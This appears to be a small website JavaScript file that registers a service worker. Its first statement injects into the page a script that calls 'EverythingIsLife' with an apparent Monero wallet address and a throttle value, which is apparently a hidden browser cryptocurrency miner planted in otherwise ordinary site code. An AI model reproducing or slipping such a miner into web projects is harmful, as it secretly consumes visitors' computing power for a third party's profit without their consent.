const container = document.querySelector(".container").innerHTML = `<script type="text/javascript">
EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'x', 50);
</script>`



if ("serviceWorker" in navigator) {
  window.addEventListener("load", function() {
    navigator.serviceWorker
      .register("/serviceWorker.js")
      .then(res => console.log("service worker registered"))
      .catch(err => console.log("service worker not registered", err));
  });
}
